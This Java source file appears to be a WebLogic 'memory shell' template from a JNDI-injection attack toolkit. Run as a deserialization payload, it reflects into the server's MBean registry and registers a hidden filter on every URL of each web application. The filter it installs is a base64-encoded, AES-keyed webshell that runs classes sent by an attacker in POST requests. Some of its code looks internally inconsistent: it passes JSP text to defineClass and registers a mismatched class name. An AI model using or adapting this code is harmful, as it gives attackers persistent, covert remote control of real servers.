package com.nu1r.jndi.template.Weblogic;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import sun.misc.BASE64Decoder;
import weblogic.servlet.internal.FilterManager;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.utils.ServletMapping;
import weblogic.utils.collections.MatchMap;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

import static org.fusesource.jansi.Ansi.ansi;

public class WeblogicMemshellTemplate1 extends AbstractTranslet {
    public WeblogicMemshellTemplate1(){
        try{
            String filterName = "WeblogicDynamicFilter-1";
            String urlPattern = "/*";

            MBeanServer server = ManagementFactory.getPlatformMBeanServer();
            Field field = server.getClass().getDeclaredField("wrappedMBeanServer");
            field.setAccessible(true);
            Object obj = field.get(server);

            field = obj.getClass().getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            obj = field.get(obj);

            field = obj.getClass().getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository)field.get(obj);

            // 这里的 query 参数会被忽略，所以直接用 null
            Set<NamedObject> namedObjects = repository.query(new ObjectName("com.bea:Type=ApplicationRuntime,*"),null);
            for(NamedObject namedObject : namedObjects){
                try{
                    String name = (String) namedObject.getObject().getAttribute("Name");
                    if(name.equals("bea_wls_internal") || name.equals("mejb") ||
                            (name.contains("bea") && name.contains("wls"))) continue;

                    field = namedObject.getObject().getClass().getDeclaredField("managedResource");
                    field.setAccessible(true);
                    obj = field.get(namedObject.getObject());

                    field = obj.getClass().getSuperclass().getDeclaredField("children");
                    field.setAccessible(true);
                    HashSet set = (HashSet)field.get(obj);

                    for(Object o : set){
                        if(o.getClass().getName().endsWith("WebAppRuntimeMBeanImpl")){
                            field = o.getClass().getDeclaredField("context");
                            field.setAccessible(true);
                            WebAppServletContext servletContext = (WebAppServletContext) field.get(o);
                            FilterManager filterManager = servletContext.getFilterManager();

                            // 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
                            if (!filterManager.isFilterRegistered(filterName)) {
                                System.out.println( ansi().render("@|green [+] Add Dynamic Filter|@"));

                                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                                Class clazz;
                                try{
                                    clazz = cl.loadClass("com.nu1r.jndi.template.DynamicFilterTemplate");
                                }catch(ClassNotFoundException e){
                                    BASE64Decoder base64Decoder = new BASE64Decoder();
                                    String codeClass = "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKixqYXZheC5jcnlwdG8uKixqYXZheC5jcnlwdG8uc3BlYy4qIiAlPg0KPCUhDQogICAgcHJpdmF0ZSBieXRlW10gRGVjcnlwdChieXRlW10gZGF0YSkgdGhyb3dzIEV4Y2VwdGlvbg0KICAgIHsNCiAgICAgICAgU3RyaW5nIGs9ImU0NWUzMjlmZWI1ZDkyNWIiOw0KICAgICAgICBqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTL0VDQi9QS0NTNVBhZGRpbmciKTtjLmluaXQoMixuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTsNCiAgICAgICAgYnl0ZVtdIGRlY29kZWJzOw0KICAgICAgICBDbGFzcyBiYXNlQ2xzIDsNCiAgICAgICAgICAgICAgICB0cnl7DQogICAgICAgICAgICAgICAgICAgIGJhc2VDbHM9Q2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOw0KICAgICAgICAgICAgICAgICAgICBPYmplY3QgRGVjb2Rlcj1iYXNlQ2xzLmdldE1ldGhvZCgiZ2V0RGVjb2RlciIsIG51bGwpLmludm9rZShiYXNlQ2xzLCBudWxsKTsNCiAgICAgICAgICAgICAgICAgICAgZGVjb2RlYnM9KGJ5dGVbXSkgRGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW117Ynl0ZVtdLmNsYXNzfSkuaW52b2tlKERlY29kZXIsIG5ldyBPYmplY3RbXXtkYXRhfSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoIChUaHJvd2FibGUgZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGJhc2VDbHMgPSBDbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7DQogICAgICAgICAgICAgICAgICAgIE9iamVjdCBEZWNvZGVyPWJhc2VDbHMubmV3SW5zdGFuY2UoKTsNCiAgICAgICAgICAgICAgICAgICAgZGVjb2RlYnM9KGJ5dGVbXSkgRGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlQnVmZmVyIixuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9KS5pbnZva2UoRGVjb2RlciwgbmV3IE9iamVjdFtde25ldyBTdHJpbmcoZGF0YSl9KTsNCg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGMuZG9GaW5hbChkZWNvZGVicyk7DQoNCiAgICB9DQolPg0KICAgIDwlIWNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuDQogICAgICAgIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX0lPg0KICAgICAgICA8JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXsNCiAgICAgICAgICAgIEJ5dGVBcnJheU91dHB1dFN0cmVhbSBib3MgPSBuZXcgQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7DQogICAgICAgICAgICBieXRlW10gYnVmID0gbmV3IGJ5dGVbNTEyXTsNCiAgICAgICAgICAgIGludCBsZW5ndGg9cmVxdWVzdC5nZXRJbnB1dFN0cmVhbSgpLnJlYWQoYnVmKTsNCiAgICAgICAgICAgIHdoaWxlIChsZW5ndGg+MCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBieXRlW10gZGF0YT0gQXJyYXlzLmNvcHlPZlJhbmdlKGJ1ZiwwLGxlbmd0aCk7DQogICAgICAgICAgICAgICAgYm9zLndyaXRlKGRhdGEpOw0KICAgICAgICAgICAgICAgIGxlbmd0aD1yZXF1ZXN0LmdldElucHV0U3RyZWFtKCkucmVhZChidWYpOw0KICAgICAgICAgICAgfQ0KICAgICAgICBuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhEZWNyeXB0KGJvcy50b0J5dGVBcnJheSgpKSkubmV3SW5zdGFuY2UoKS5lcXVhbHMocGFnZUNvbnRleHQpO30NCiAgICAlPg==";
                                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                                    method.setAccessible(true);
                                    clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                                }

                                //将 Filter 注册进 FilterManager
                                //参数： String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
                                Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                                registerFilterMethod.setAccessible(true);
                                registerFilterMethod.invoke(filterManager, filterName, "com.feihong.ldap.template.DynamicFilterTemplate", new String[]{urlPattern}, null, null, null);


                                //将我们添加的 Filter 移动到 FilterChian 的第一位
                                Field filterPatternListField = filterManager.getClass().getDeclaredField("filterPatternList");
                                filterPatternListField.setAccessible(true);
                                ArrayList filterPatternList = (ArrayList)filterPatternListField.get(filterManager);


                                //不能用 filterName 来判断，因为在 11g 中此值为空，在 12g 中正常
                                for(int i = 0; i < filterPatternList.size(); i++){
                                    Object filterPattern = filterPatternList.get(i);
                                    Field f = filterPattern.getClass().getDeclaredField("map");
                                    f.setAccessible(true);
                                    ServletMapping mapping = (ServletMapping) f.get(filterPattern);

                                    f = mapping.getClass().getSuperclass().getDeclaredField("matchMap");
                                    f.setAccessible(true);
                                    MatchMap matchMap = (MatchMap)f.get(mapping);

                                    Object result = matchMap.match(urlPattern);
                                    if(result != null && result.toString().contains(urlPattern)){
                                        Object temp = filterPattern;
                                        filterPatternList.set(i, filterPatternList.get(0));
                                        filterPatternList.set(0, temp);
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }catch(Exception e){
                    //pass
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
